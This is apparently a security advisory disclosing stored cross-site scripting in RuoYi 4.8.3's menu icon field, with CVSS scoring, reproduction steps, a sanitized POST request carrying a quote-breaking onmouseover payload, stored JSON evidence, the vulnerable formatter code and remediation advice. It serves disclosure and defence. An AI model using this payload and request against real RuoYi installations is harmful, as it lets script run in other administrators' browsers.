# RuoYi menu icon attribute stored XSS

## Summary

RuoYi 4.8.3 contains stored cross-site scripting in the menu management list. The stored menu icon value is concatenated into an i-element class attribute by the page formatter without attribute encoding. A user with menu modification permission can inject an event handler that executes when another administrator views the menu list.

## Affected product

- Vendor/project: **yangzongzhuan**
- Product: **RuoYi**
- Affected version: **4.8.3**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (4.8)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

User with menu add/edit permission; victim opens menu management and interacts with the icon.

Verified flow: `menu icon field → /system/menu/list JSON → menu.html formatter → i.class attribute`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a menu item whose icon contains a quote-breaking event attribute.
2. Confirm the menu-list JSON returns the exact stored icon value.
3. Open the menu management list and hover the crafted icon.

Sanitized request shape used during verification:

```http
# User requires system:menu:add or system:menu:edit
POST <BASE_URL>/system/menu/add
Cookie: <SESSION_COOKIE>
Content-Type: application/x-www-form-urlencoded

menuName=gt48261022ic3
parentId=1&menuType=C&orderNum=99
url=/gt48261022ic3
icon=gt48261022ic3%22%20onmouseover%20%3D%20self%5B%22al%22%2B%22ert%22%5D%281%29%20x%3D%22
visible=1&status=0&isRefresh=1&target=&perms=

# Storage proof; opening /system/menu invokes the vulnerable formatter
POST <BASE_URL>/system/menu/list
Cookie: <SESSION_COOKIE>

url=/gt48261022ic3
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022ic1` | raw icon attribute payload | **PASS** |
| 2 | `gt48261022ic2` | raw icon attribute payload | **PASS** |
| 3 | `gt48261022ic3` | raw icon attribute payload | **PASS** |

```text
Saved menu/list JSON, run 3:
{
  "menuName": "gt48261022ic3",
  "url": "/gt48261022ic3",
  "icon": "gt48261022ic3\" onmouseover = self[\"al\"+\"ert\"](1) x=\""
}

The value contains no angle brackets, survives the server HTML filter, and
breaks out of the existing class attribute in the formatter.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
menu.html:81-85
formatter: function(value, row, index) {
    if ($.common.isEmpty(row.icon)) {
        return row.menuName;
    } else {
        return '<i class="' + row.icon + '"></i> ' +
               '<span class="nav-label">' + row.menuName + '</span>';
    }
}
```

Root cause: The stored icon field is treated as a trusted CSS class and concatenated into an HTML attribute. The formatter result is inserted as HTML.

## Recommended remediation

Whitelist known icon class names and attribute-encode the selected value. Prefer DOM classList over HTML string construction.

## References

- Official source: https://github.com/yangzongzhuan/RuoYi/blob/master/ruoyi-admin/src/main/resources/templates/system/menu/menu.html

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-12 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/01-reproduction-v2.png)

### Three-run success proof

![CAN-12 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-12 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-12/03-source-sink-v2.png)
